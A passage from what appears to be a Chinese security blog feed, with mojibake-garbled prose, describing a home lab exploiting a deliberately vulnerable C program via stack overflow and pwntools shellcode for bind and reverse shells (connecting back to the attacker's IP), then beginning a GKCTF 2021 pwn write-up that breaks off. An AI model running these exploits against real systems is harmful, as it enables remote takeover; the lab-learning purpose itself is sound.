(c,buf,<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡‡ç”¨gcc test.c -fno-stack-protector -z execstack -no-pie -o test  #è¿™é‡Œå…³é—­äº†canaryå’ŒNXä¿æŠ¤</p><p><img src="/../img/2706180-20220311170534186-1125823830.png"></p><p><img src="/../img/2706180-20220311170542067-511506874.png"></p><p>ç”¨IDAçœ‹ä¸€ä¸‹ï¼Œå¾—åˆ°äº†æº¢å‡ºçš„åç§»ï¼ˆ0x16+8)ã€‚</p><p>ç”±äºæ²¡æœ‰å¼€å¯NXï¼Œæˆ‘ä»¬ä½¿ç”¨shellcodeã€‚å¦‚æœåªæ˜¯æ­£å¸¸å¼€å¯shellçš„shellcodeçš„è¯ï¼Œé‚£å°±æ˜¯æœ¬æ–‡æœ€å¼€å§‹ç¬¬äºŒä¸ªé—®é¢˜æ‰€å‡ºç°çš„æƒ…å†µï¼ˆå°±æ˜¯ç¡®å®æ˜¯å¼€å¯äº†ä¸€ä¸ªshellï¼Œä½†æ˜¯å¼€åœ¨äº†ç›®æ ‡æœºä¸Šï¼Œè·Ÿæ”»å‡»è€…æ²¡æœ‰ä»»ä½•å…³ç³»ï¼‰</p><p>å› æ­¤è¿™é‡Œæˆ‘ä»¬å°±è¦æ¢ä¸€ç§shellcodeã€‚åœ¨è¿™ä¹‹å‰è¿˜è¦å­¦ä¹ ä¸€ä¸‹æ­£è¿ä¸åè¿ã€‚</p><h2 id="æ­£è¿ï¼ˆæ­£å‘shellï¼‰"><a href="#æ­£è¿ï¼ˆæ­£å‘shellï¼‰" class="headerlink" title="æ­£è¿ï¼ˆæ­£å‘shellï¼‰"></a>æ­£è¿ï¼ˆæ­£å‘shellï¼‰</h2><p>æˆ‘å¤§æ¦‚è¯´ä¸€ä¸‹æ­£è¿çš„åŸç†ã€‚æˆ‘ä»¬ç°åœ¨æœ‰ä¸€ä¸ª<strong>shellcode</strong>ï¼Œä»–çš„åŠŸèƒ½æ˜¯<strong>åœ¨ç›®æ ‡æœºä¸Šå¼€å¯ä¸€ä¸ªshell</strong>ï¼ˆç°åœ¨çœ‹æ¥åŠŸèƒ½å’Œå¯»å¸¸è·å–shellçš„shellcodeæ²¡ä»€ä¹ˆåŒºåˆ«ï¼‰ï¼Œä¸è¿‡ç´§æ¥ç€<strong>è¿™ä¸ªshellcodeè¿˜ä¼šå°†åˆšåˆšå¼€å¯çš„è¿™ä¸ªshell çš„è¾“å…¥ã€è¾“å‡ºç»‘å®šåˆ°æˆ‘ä»¬æŒ‡å®šçš„ç«¯å£ä¸Šï¼ˆè¿™ä¸ªç«¯å£æ˜¯åœ¨ç›®æ ‡æœºä¸Šçš„ï¼‰</strong>ã€‚ç„¶å<strong>æˆ‘ä»¬ç»§ç»­åˆ©ç”¨pwntoolså»è¿æ¥è¿™ä¸ªæ–°å¼€çš„ç«¯å£ï¼Œè¿™æ ·æˆ‘ä»¬å°±è·å¾—äº†ä¸€ä¸ªå¯ä»¥ä¸ç›®æ ‡æœºäº§ç”Ÿäº¤äº’çš„shellï¼ˆå› ä¸ºæˆ‘ä»¬è¿œç¨‹è¿æ¥äº†ç›®æ ‡æœºä¸€ä¸ªç«¯å£ä¸Šçš„shellå˜›ï¼‰</strong>ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;192.168.43.71&quot;</span>,<span class="number">8888</span>)</span><br><span class="line">sc = asm(shellcraft.bindsh(<span class="number">4444</span>))<span class="comment">#è¿™ä¸ªæ„æ€å°±æ˜¯å¼€å¯ä¸€ä¸ªshellï¼ŒæŠŠè¿™ä¸ªshellç»‘å®šåˆ°4444ç«¯å£</span></span><br><span class="line">io.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">30</span>+p64(<span class="number">0x400669</span>)+sc)<span class="comment">#è¿™ä¸ªåç§»æ˜¯30ï¼Œä½†æ˜¯å¥½åƒä¸åŒçš„æœºå™¨ç¼–è¯‘æºç ä¹‹åï¼Œè¿™ä¸ªåç§»å¯èƒ½ä¸ä¸€æ ·ã€‚ç„¶åè¿™ä¸ª0x400669æ˜¯jmp rspçš„ä½ç½®ï¼Œè¿™ä¸ªä¸åŒç”µè„‘çš„è¿™ä¸ªæŒ‡ä»¤ä½ç½®ä¹Ÿæ˜¯ä¸åŒçš„ï¼Œè¿˜æ˜¯è¦è‡ªå·±ç”¨ROPgadgetæœä¸€ä¸‹å§ã€‚</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&quot;192.168.43.71&quot;</span>,<span class="number">4444</span>)<span class="comment">#ç„¶åå†æ¬¡è¿æ¥åˆ°åˆšåˆšå¼€å¯çš„shellä¸Š</span></span><br><span class="line">sh.interactive()<span class="comment">#è¿™ä¸ªäº¤äº’æ˜¯ä¸shäº¤äº’ï¼Œè€Œä¸æ˜¯ä¸ioäº¤äº’</span></span><br></pre></td></tr></table></figure><p>å› ä¸ºkaliæ˜¯ä»¥rootæƒé™è¿è¡Œçš„æ¼æ´ç¨‹åºï¼Œå› æ­¤ç”¨è„šæœ¬å¼€å¯çš„shellå°±ç›´æ¥æ˜¯rootæƒé™ï¼Œè¿˜å¯ä»¥åˆ›å»ºå’Œåˆ é™¤æ–‡ä»¶ã€‚</p><p><img src="/../img/2706180-20220311170554118-208807962.png"></p><p><img src="/../img/2706180-20220311170602137-1122006877.png"></p><p>å¯ä»¥çœ‹åˆ°å¦‚æœæ˜¯ä»¥rootæƒé™å¼€å¯shellçš„è¯ï¼Œå¨åŠ›è¿˜æ˜¯éå¸¸å¤§çš„ã€‚ä¹Ÿå°±æ˜¯è¯´è¢«æ”»å‡»è€…ç”¨ä»€ä¹ˆæƒé™è¿è¡Œçš„æ¼æ´ç¨‹åºï¼Œæ”»å‡»è€…è¿œç¨‹è·å–çš„shellå°±æ˜¯ä»€ä¹ˆæƒé™ã€‚</p><h2 id="åè¿ï¼ˆåå‘shellï¼‰"><a href="#åè¿ï¼ˆåå‘shellï¼‰" class="headerlink" title="åè¿ï¼ˆåå‘shellï¼‰"></a>åè¿ï¼ˆåå‘shellï¼‰</h2><p>å…³äºåå¼¹shellå¯ä»¥é˜…è¯»ä¸‹é¢ä¸¤ç¯‡æ–‡ç« </p><p><a href="https://xz.aliyun.com/t/2548">https://xz.aliyun.com/t/2548</a></p><p><a href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a></p><p>åˆ©ç”¨è¿™ä¸ªåè¿çš„è¯ï¼Œæˆ‘ä»¬<strong>éœ€è¦å…ˆç›‘å¬æœ¬æœºçš„ä¸€ä¸ªç«¯å£</strong>ï¼ˆä½ å¯ä»¥æŠŠè¿™ä¸ªç›‘å¬ç†è§£æˆæ‰“å¼€ï¼‰ï¼Œç„¶åä¹Ÿæ˜¯åˆ©ç”¨ä¸€æ®µshellcodeï¼Œ<strong>è¿™ä¸ªshellcodeä¼šå®ç°åå¼¹shell</strong>ï¼Œ<strong>å°†shellåå¼¹åˆ°æˆ‘åœ¨æœ¬æœºå¼€çš„ç«¯å£ä¸Šå»ã€‚ç„¶åç”¨pwntoolsä¸­çš„wait_for_connectionå‡½æ•°ç­‰å¾…ç€åè¿</strong>ã€‚ç­‰åˆ°åè¿æˆåŠŸåï¼Œå³å¯åœ¨æ”»å‡»è€…çš„çª—å£å¼€å¯ä¸€ä¸ªä¸ç›®æ ‡æœºäº¤äº’çš„shellã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = listen(<span class="number">4444</span>)<span class="comment">#åœ¨æœ¬æœºç›‘å¬4444ç«¯å£</span></span><br><span class="line">io = remote(<span class="string">&quot;192.168.43.71&quot;</span>,<span class="number">8888</span>)<span class="comment">#è¿œç¨‹è¿æ¥åˆ°ç›®æ ‡æœº</span></span><br><span class="line">shellcode = asm(shellcraft.connect(<span class="string">&#x27;192.168.43.150&#x27;</span>,<span class="number">4444</span>)+shellcraft.dupsh())<span class="comment">#è®©ç›®æ ‡æœºè¿æ¥åˆ°æˆ‘ä»¬æœ¬æœºå¼€æ”¾çš„ç«¯å£</span></span><br><span class="line">io.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">30</span>+p64(<span class="number">0x400669</span>)+shellcode)</span><br><span class="line"></span><br><span class="line">sh.wait_for_connection()</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™æ¬¡kaliä½¿ç”¨äº†æ™®é€šç”¨æˆ·æ¥è¿è¡Œæ¼æ´ç¨‹åºï¼Œå¯ä»¥çœ‹è§è¿™æ¬¡æ”»å‡»è€…å°±æ²¡æœ‰åŠæ³•å»åˆ›å»ºæˆ–æ˜¯åˆ é™¤æ–‡ä»¶äº†ã€‚</p><p><img src="/../img/2706180-20220311170613647-976763824.png"></p><p><img src="/../img/2706180-20220311170621593-1348201456.png"></p><p>æ€»ç»“ä¸€ä¸‹æ­£å‘shellå’Œåå‘shellã€‚<strong>åœ¨å®é™…çš„æ”»å‡»å½“ä¸­ï¼Œæ­£å‘shellæ˜¯æ”»å‡»è€…è¿æ¥è¢«æ”»å‡»è€…çš„æœºå™¨ï¼Œå¯ä»¥ç”¨äºæ”»å‡»è€…èº«å¤„å†…ç½‘ï¼Œè¢«æ”»å‡»è€…èº«å¤„å¤–ç½‘çš„æƒ…å†µï¼›è€Œåå‘shellåˆ™æ˜¯è¢«æ”»å‡»è€…ä¸»åŠ¨è¿æ¥æ”»å‡»è€…ï¼Œå¯ä»¥ç”¨äºæ”»å‡»è€…å¤„äºå¤–ç½‘ï¼Œè¢«æ”»å‡»è€…å¤„äºå†…ç½‘çš„æƒ…å†µ</strong>ã€‚ </p><p>å…¶å®æœ¬æ¬¡æ”»å‡»åˆ°æ­¤ä¹Ÿå°±ç»“æŸäº†ï¼Œæˆ‘ä»¬åˆ†åˆ«ç”¨æ­£è¿å’Œåè¿çš„æ–¹æ³•è·å–äº†ç›®æ ‡æœºçš„shellã€‚ä½†å¾€å¾€å¾ˆå¤šä¸œè¥¿çœ‹ç€ç®€å•ï¼Œä½†åšçš„éš¾ã€‚å®é™…æ“ä½œçš„æ—¶å€™å°±ä¼šé‡è§å„ç§å„æ ·ç¨€å¥‡å¤æ€ªçš„é—®é¢˜ï¼Œä¹Ÿä¼šç»•è®¸å¤šå¼¯è·¯ã€‚</p><h2 id="åœ¨å®Œæˆå®éªŒæ—¶æ‰€ç¢°åˆ°çš„é—®é¢˜"><a href="#åœ¨å®Œæˆå®éªŒæ—¶æ‰€ç¢°åˆ°çš„é—®é¢˜" class="headerlink" title="åœ¨å®Œæˆå®éªŒæ—¶æ‰€ç¢°åˆ°çš„é—®é¢˜"></a>åœ¨å®Œæˆå®éªŒæ—¶æ‰€ç¢°åˆ°çš„é—®é¢˜</h2><h3 id="1ã€åŒæ­¥ç½‘æ®µé—®é¢˜"><a href="#1ã€åŒæ­¥ç½‘æ®µé—®é¢˜" class="headerlink" title="1ã€åŒæ­¥ç½‘æ®µé—®é¢˜"></a>1ã€åŒæ­¥ç½‘æ®µé—®é¢˜</h3><p>é¦–å…ˆæ˜¯å°†ä¸¤ä¸ªè™šæ‹Ÿæœºéƒ¨ç½²åœ¨åŒä¸€ä¸ªç½‘æ®µçš„é—®é¢˜ï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œåªéœ€è¦è®©è™šæ‹Ÿæœºå¼€æ¡¥æ¥æ¨¡å¼å³å¯ã€‚</p><p><img src="/../img/2706180-20220311170629421-1313264995.png"></p><p><strong>è¿™æ˜¯æ­£å¸¸æƒ…å†µä¸‹ï¼Œå¼€å¯æ¡¥æ¥æ¨¡å¼ä¹‹åï¼Œè™šæ‹Ÿæœºå°±ä¼šå’Œä¸»æœºåœ¨åŒä¸€ä¸ªç½‘æ®µä¸‹é¢</strong>ï¼Œåªè¦è®©ä¸¤å°ä¸»æœºå»è¿ä¸€ä¸ªç›¸åŒçš„çƒ­ç‚¹ï¼Œè¿™æ ·ubuntuå’Œkaliå°±å¯ä»¥å¤„äºåœ¨ä¸€ä¸ªç½‘æ®µä¸Šäº†ã€‚ä½†å¤©æœ‰ä¸æµ‹é£äº‘ï¼Œæˆ‘çš„ç”µè„‘å¼€å¯æ¡¥æ¥ä¹‹åï¼Œè™šæ‹Ÿæœºå’Œä¸»æœºå¹¶ä¸åœ¨ä¸€ä¸ªç½‘æ®µä¸Šã€‚</p><p>æˆ‘é‡‡ç”¨çš„è§£å†³æ–¹æ³•æ˜¯è®©VMnet0æ¡¥æ¥åˆ°ç‰©ç†ç½‘å¡ä¸Šã€‚</p><p><img src="/../img/2706180-20220311170636696-617709141.png"></p><p>ç„¶ååœ¨ç½‘ç»œé€‚é…å™¨è¿™é‡Œæ”¹æˆè‡ªå®šä¹‰ï¼Œå»è¿æ¥VMnet0ã€‚<strong>ï¼ˆå› ä¸ºæˆ‘å½“æ—¶ä¸çŸ¥é“å’‹æçš„ï¼ŒæŠŠè™šæ‹Ÿç½‘å¡å¼„æ²¡äº†ä¸€ä¸ªï¼Œç”¨è¿™ä¸ªæ–¹æ³•çš„è¯ï¼Œå¯ä»¥è®©è‡ªå·±çš„ä¸¤ä¸ªè™šæ‹Ÿæœºéƒ½æ¡¥æ¥åˆ°ä¸€ä¸ªç‰©ç†ç½‘å¡ä¸Šé¢ï¼‰</strong><br><img src="/../img/2706180-20220311170644194-2024796383.png"></p><p>æœ€åä¸¤ä¸ªè™šæ‹Ÿæœºéƒ½å¤„äºäº†åŒä¸€ç½‘æ®µã€‚</p><h3 id="2ã€socatå·¥å…·ç»‘å®šç«¯å£å‡ºç°çš„é—®é¢˜"><a href="#2ã€socatå·¥å…·ç»‘å®šç«¯å£å‡ºç°çš„é—®é¢˜" class="headerlink" title="2ã€socatå·¥å…·ç»‘å®šç«¯å£å‡ºç°çš„é—®é¢˜"></a>2ã€socatå·¥å…·ç»‘å®šç«¯å£å‡ºç°çš„é—®é¢˜</h3><p>æœ€å¼€å§‹çš„æ—¶å€™ï¼Œæˆ‘å†™äº†ä¸€ä¸ªåªæœ‰æ¼æ´çš„ç¨‹åºï¼ˆæ²¡æœ‰å¼€å¯ç«¯å£è¿™éƒ¨åˆ†ï¼‰ï¼Œç„¶åæˆ‘æ˜¯ç”¨socatå·¥å…·å»ç»‘å®šçš„ã€‚ç»‘å®šçš„ä¹Ÿå¾ˆæˆåŠŸã€‚ç„¶åå°±å»å†™è„šæœ¬æ‰“ï¼Œå¯æ˜¯ä¸ç®¡æ€ä¹ˆæ‰“è„šæœ¬ï¼Œæœ€åå¾—åˆ°çš„éƒ½æ˜¯EOF</p><p><img src="/../img/2706180-20220311170650236-893387920.png"></p><p>è¯·æ•™äº†roderickå¸ˆå‚…ä¹‹åï¼Œå¾—å‡ºæ¥çš„ç»“è®ºæ˜¯<strong>socatä¸çŸ¥é“å› ä¸ºä»€ä¹ˆåŸå› ï¼Œç­‰åˆ°shellcodeæ‰§è¡Œä¹‹åï¼Œå…³é—­äº†socketã€‚å› æ­¤è¿™é‡Œçš„ç«¯å£ä¸è¿›ç¨‹ç»‘å®šä¸èƒ½ç”¨socatå·¥å…·æ¥ç»‘å®šäº†</strong>ï¼Œå°±é‡‡ç”¨äº†<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/13/getshell3/%E8%BF%99%E4%B8%AA%E5%B8%88%E5%82%85%E5%8D%9A%E5%AE%A2%E4%B8%8A%E7%9A%84%E6%B6%89%E5%8F%8A%E6%80%9D%E8%B7%AF%EF%BC%8C%E5%9C%A8%E6%BC%8F%E6%B4%9E%E7%A8%8B%E5%BA%8F%E6%BA%90%E7%A0%81%E4%B8%8A%EF%BC%8C%E5%8A%A0%E4%B8%80%E6%AE%B5%E5%B0%86%E8%87%AA%E8%BA%AB%E7%BB%91%E5%AE%9A%E7%BB%99%E7%AB%AF%E5%8F%A3%E7%9A%84%E4%BB%A3%E7%A0%81%E3%80%82%E8%BF%99%E6%A0%B7%E8%BF%90%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%A8%8B%E5%BA%8F%E4%B9%8B%E5%90%8E%E8%87%AA%E5%B7%B1%E5%B0%B1%E4%B8%8E%E6%8C%87%E5%AE%9A%E7%9A%84%E7%AB%AF%E5%8F%A3%E7%BB%91%E5%AE%9A%E4%BA%86%E3%80%82">https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/13/getshell3/è¿™ä¸ªå¸ˆå‚…åšå®¢ä¸Šçš„æ¶‰åŠæ€è·¯ï¼Œåœ¨æ¼æ´ç¨‹åºæºç ä¸Šï¼ŒåŠ ä¸€æ®µå°†è‡ªèº«ç»‘å®šç»™ç«¯å£çš„ä»£ç ã€‚è¿™æ ·è¿è¡Œæ¼æ´ç¨‹åºä¹‹åè‡ªå·±å°±ä¸æŒ‡å®šçš„ç«¯å£ç»‘å®šäº†ã€‚</a></p><p>æ„Ÿæ‚Ÿï¼šä¸€æ¬¡éå¸¸éå¸¸ç®€å•çš„æ”»å‡»<strong>ï¼ˆç®€å•åˆ°æœ‰çš„åœ°æ–¹ç”šè‡³è¿˜éœ€è¦è¢«æ”»å‡»è€…çš„é…åˆï¼ŒçœŸæ­£çš„æƒ…å†µä¸­ï¼Œæ”»å‡»è€…æ€ä¹ˆæ‰èƒ½çŸ¥é“è¢«æ”»å‡»è€…å¼€æ”¾çš„ç«¯å£é‡Œæ­£å¥½è¿è¡Œäº†æ¼æ´ç¨‹åºï¼Œè€Œæ”»å‡»è€…åˆæ°å¥½æœ‰ä¸€ä¸ªè„šæœ¬ï¼Ÿè¿™äº›åœ¨æœ¬æ–‡ç« éƒ½æ²¡æœ‰æ¢ç©¶æˆ–è€…è¯´ç›®å‰ä»¥æˆ‘çš„æ°´å¹³ä¹Ÿæ²¡æ³•å»æƒ³è¿™äº›ã€‚ä½†æ˜¯ä¸å½±å“åœ¨æˆ‘ä»¬å»ºç«‹å‡è®¾çš„å‰æä¸‹å»è¿›è¡Œä¸€äº›å®éªŒå’Œæ€è€ƒï¼‰</strong>ï¼Œåœ¨å®éªŒçš„è¿‡ç¨‹ä¸­ç¢°åˆ°äº†å¾ˆå¤šå°é—®é¢˜ï¼Œæœ‰çš„æ˜¯å¡äº†ä¸€ä¼šï¼Œæœ‰çš„åˆ™æ˜¯å¡äº†ä¸€å¤©ï¼Œå¦‚åŒä¸Šé¢ç¬¬äºŒä¸ªé‚£ä¸ªé—®é¢˜ï¼Œæè¿°å®ƒå¾ˆç®€å•ï¼Œåªç”¨äº†ä¸¤å¥è¯ï¼Œä½†æ˜¯å‘ç°è¿™ä¸ªé—®é¢˜æ‰€åœ¨å´æ˜¯ç”¨äº†ä¸€å¤©å¤šçš„æ—¶é—´ã€‚çœ‹åˆ«äººæ“ä½œæ€»æ˜¯æ„Ÿè§‰å¾ˆç®€å•ï¼ŒåŒ…æ‹¬è‡ªå·±çš„æ‰€è®¤ä¸ºçš„æ€è·¯ä¹Ÿæƒ³çš„å¾ˆç®€å•ï¼Œæœ‰æ—¶å€™æˆ‘ä»¬è®¤ä¸ºä¸å¯èƒ½å‡ºç°é—®é¢˜çš„åœ°æ–¹ï¼Œå´æ°æ°æ˜¯å¡äº†æˆ‘ä»¬å¾ˆä¹…çš„åœ°æ–¹ã€‚<strong>å› æ­¤åœ¨å¹³å¸¸çš„åšé¢˜ä»¥åŠå­¦ä¹ çš„è¿‡ç¨‹ä¸­ï¼Œè¿˜æ˜¯è¦å¤šå»æ€è€ƒï¼Œå¤šå»é—®ï¼Œå¤šå»å®è·µï¼Œæ‰èƒ½æ›´å¿«çš„è¿›æ­¥ã€‚</strong></p><p>æœ€åæœ¬æ–‡è¿˜è¦æ„Ÿè°¢ <a href="https://roderickchan.github.io/">roderickå¸ˆå‚…</a> ä»¥åŠæˆ‘çš„ä¸¤ä½åŒå­¦ï¼ˆ<a href="https://www.timochan.cn/">æè«é…±</a> å’Œ <a href="https://www.cnblogs.com/LQ-Joker">joker</a>ï¼‰ï¼Œå¦‚æœæ²¡æœ‰ä»–ä»¬çš„å¸®åŠ©ï¼Œä¹Ÿè®¸æˆ‘è¿˜ä¼šç»•å¾ˆå¤šå¼¯è·¯ã€‚</p><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/13/getshell3/">https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/13/getshell3/</a></p><p><a href="https://xz.aliyun.com/t/2548">https://xz.aliyun.com/t/2548</a></p><p><a href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¢ç©¶ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®éªŒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GKCTF 2021_checkin</title>
      <link href="/posts/a81fb7da.html"/>
      <url>/posts/a81fb7da.html</url>
      
        <content type="html"><![CDATA[<h1 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h1><p>1ã€è¿™é“é¢˜md5åŠ å¯†è¿™ä¸ªç‚¹ï¼Œå…¶å®è›®é‡è¦çš„ï¼Œä¸ªäººæ„Ÿè§‰æƒ³åˆ¤æ–­å‡ºæ¥çš„è¯ï¼Œåªèƒ½æ˜¯é ç»éªŒçš„ç§¯ç´¯ã€‚ä¸‹å›åªè¦é‡è§äº†è¿™ç§å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°ï¼Œè¿˜ç»™äº†ç±»ä¼¼äºå¯†æ–‡è¿™ç§ä¸œè¥¿ï¼Œå°±å»è€ƒè™‘åŠ å¯†ã€‚</p><p>2ã€èƒ½å¤Ÿè¾“å…¥çš„å­—èŠ‚å¾ˆå°‘çš„æ—¶å€™ï¼Œæ‰§è¡ŒæŸä¸ªå‡½æ•°ï¼Œå¯ä»¥å°è¯•å†™callçš„è¿™ä¸ªåœ°å€ï¼Œè¿™æ ·å³å¯ä»¥æ‰§è¡Œå‡½æ•°ï¼Œåˆå¯ä»¥æ§åˆ¶æ‰§è¡Œæµï¼ˆåªè¦æˆ‘ä»¬å¯ä»¥æŠŠæ§å¥½é€‰å–çš„callåœ°å€å³å¯ï¼‰</p><p>3ã€åæœŸè°ƒè¯•çš„è¯ï¼Œå¤šæŒ‰è‡ªå·±çš„æ€è·¯æ€è€ƒï¼ˆä¸è¦è¢«ç½‘ä¸Šå…¶ä»–å¸ˆå‚…å†™çš„wpæ‰€å±€é™äº†ï¼‰ã€‚</p><h1 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h1><p><img src="/../img/2706180-20220331215203116-666268230.png"></p><h1 id="ç¨‹åºåˆ†æï¼š"><a href="#ç¨‹åºåˆ†æï¼š" class="headerlink" title="ç¨‹åºåˆ†æï¼š"></a>ç¨‹åºåˆ†æï¼š</h1><p><img src="/../img/2706180-20220331215212743-248424037.png"></p><p>è¾“å…¥ç‚¹æœ‰ä¸¤å¤„ï¼Œç¬¬ä¸€æ¬¡è¾“å…¥æ˜¯è¾“å…¥åˆ°bssæ®µï¼Œç¬¬äºŒæ¬¡è¾“å…¥æ˜¯ç»™åˆ°buf,å­˜åœ¨å…«å­—èŠ‚çš„æº¢å‡ºã€‚ä¸€çœ‹è¿™ç§å­˜åœ¨å…«å­—èŠ‚çš„æº¢å‡ºåŸºæœ¬å°±å¯ä»¥ç¡®å®šæ˜¯æ ˆè¿ç§»æ²¡è·‘äº†ã€‚</p><p>ç„¶åç¬¬ä¸€æ¬¡è¾“å…¥çš„æ•°æ®ï¼Œå‰äº”ä¸ªå­—èŠ‚å¿…é¡»æ˜¯adminï¼Œå¦åˆ™çš„è¯å°±ä¼šè§¦å‘exitã€‚åŒæ—¶sub_401974å‡½æ•°çš„è¿”å›å€¼ä¹Ÿå¿…é¡»æ˜¯0ï¼Œå¦åˆ™å°±ä¼šè§¦å‘exitã€‚æˆ‘ä»¬è‚¯å®šæ˜¯ä¸èƒ½å»è§¦å‘è¿™ä¸ªexitçš„ï¼Œä¸ç„¶ç¨‹åºç›´æ¥å°±ç»“æŸäº†ã€‚</p><p><img src="/../img/2706180-20220331215224208-1732771002.png"></p><p>è§‚å¯Ÿsub_401974å‡½æ•°ï¼Œå‘ç°è¿™ä¸ªå‡½æ•°å¾ˆå¥‡æ€ªï¼Œé¦–å…ˆæ˜¯ç»™äº†ä¸ªæ•°ç»„v4ï¼Œç„¶åèµ‹äº†ä¸¤ä¸ªè«åå…¶å¦™çš„å€¼ï¼Œç„¶åå‘ç°è¿”å›å€¼çš„åœ°æ–¹æœ‰ä¸€ä¸ªåˆ¤æ–­ï¼Œåªè¦v5æœ‰ä¸€ä¸ªå­—èŠ‚å’Œv4çš„ä¸åŒï¼Œå°±è¿”å›1ï¼ˆè¿™å¹¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼‰ï¼Œå¦‚æœèƒ½æˆåŠŸçš„è·‘16æ¬¡å¾ªç¯ï¼Œä¹Ÿå°±æ˜¯è¯´v5ä¸v4çš„åå…­ä¸ªå­—èŠ‚å…¨éƒ¨ç›¸åŒï¼Œæ‰ä¼šè¿”å›æˆ‘ä»¬æƒ³è¦çš„0ã€‚</p><p>çœ‹çœ‹v5æ˜¯ä»€ä¹ˆï¼Ÿç‚¹è¿›sub_400990å‡½æ•°çœ‹ä¸€ä¸‹</p><p><img src="/../img/2706180-20220331215234682-403874894.png"></p><p>å‘ç°å¾ˆå¥‡æ€ªï¼Œç„¶åæŠŠæ¯ä¸ªå‡½æ•°éƒ½ç‚¹ä¸€ä¸‹ï¼Œå‘ç°å°±æ›´å¥‡æ€ªäº†â€¦.</p><p>æƒ³é‡è§è¿™ç§å¥‡å¥‡æ€ªæ€ªçš„æƒ…å†µï¼Œå°±è€ƒè™‘åŠ å¯†çš„å½¢å¼ã€‚è€Œæœ€å¼€å§‹ç»™çš„v4çš„å€¼ï¼Œå°±æ˜¯å¯†æ–‡ã€‚</p><p>ç„¶åå°±è½¬ä¸€ä¸‹çœ‹çœ‹ï¼ˆæ·¦ï¼Œå…¶å®æˆ‘ä¹Ÿæ˜¯çœ‹å¸ˆå‚…çš„wpæ‰çŸ¥é“è¿™æ˜¯md5åŠ å¯†çš„ï¼Œè¿™åªèƒ½é ç»éªŒå’Œç§¯ç´¯æ¥åˆ¤æ–­å§ï¼Ÿï¼‰ï¼Œå‘ç°æ˜¯md5åŠ å¯†ã€‚</p><p><img src="/../img/2706180-20220331215251779-22545722.png"></p><p>ç”±äºè¿™ä¸ªæ˜¯å°ç«¯åºå­˜æ”¾çš„v4ï¼Œè½¬æ¢è¿‡æ¥çš„è¯ï¼Œåº”è¯¥æ˜¯ä»å³å¾€å·¦çœ‹ã€‚</p><p>å–å‡ºæ¥æ˜¯ä¸ªè¿™ç©æ„ 21232f297a57a5a743894a0e4a801fc3</p><p>æ‰¾ä¸ªåœ¨çº¿ç½‘ç«™è½¬ä¸€ä¸‹</p><p><img src="/../img/2706180-20220331215302448-1617321460.png"></p><p>å¦‚æ­¤æ€è·¯å°±å‡ºæ¥äº†ï¼Œç¬¬ä¸€æ¬¡è¦è¾“å…¥adminï¼Œå»é€šè¿‡strncmpå‡½æ•°çš„æ£€æŸ¥ï¼Œç¬¬äºŒæ¬¡è¿˜è¦è¾“å…¥adminï¼Œå»é€šè¿‡ä¸md5åŒ¹é…çš„æ£€æŸ¥ã€‚é‚£ä¸¤æ¬¡è¾“å…¥éƒ½æ˜¯adminï¼Œæˆ‘ä»¬æ€ä¹ˆå»åŠ«æŒç¨‹åºçš„æ‰§è¡Œæµï¼Ÿ  è¿™é‡Œæˆ‘ä»¬æ˜¯å¯ä»¥é‡‡ç”¨00æˆªæ–­çš„ï¼Œæ„æ€å°±æ˜¯è¯´ç”¨00æ¥å£°æ˜md5åŠ å¯†çš„å†…å®¹ç»“æŸï¼Œè€Œ00åé¢çš„å°±ä¸ä¼šè¢«åŠ å¯†äº†ï¼Œä½†00åé¢çš„å†…å®¹å·²ç»æ˜¯å­˜åœ¨çš„ã€‚</p><h1 id="å¤§è‡´æ€è·¯ï¼š"><a href="#å¤§è‡´æ€è·¯ï¼š" class="headerlink" title="å¤§è‡´æ€è·¯ï¼š"></a>å¤§è‡´æ€è·¯ï¼š</h1><p>è¿™é“é¢˜å¿…ç„¶æ˜¯è€ƒå¯Ÿæ ˆè¿ç§»çš„ï¼Œæˆ‘ä»¬è™½ç„¶åªèƒ½æ§åˆ¶rbpï¼Œä½†æ˜¯ç”±äºè¿™ä¸ªå‡½æ•°ç»“æŸçš„æ—¶å€™ä¼šæ‰§è¡Œä¸€ä¸ªleave;retï¼Œè€Œåˆ°mainå‡½æ•°ç»“æŸçš„æ—¶å€™åˆä¼šæ‰§è¡Œä¸€ä¸ªleave;retï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦æ§åˆ¶rbpï¼Œä¾ç„¶æ˜¯å¯ä»¥å®Œæˆæ 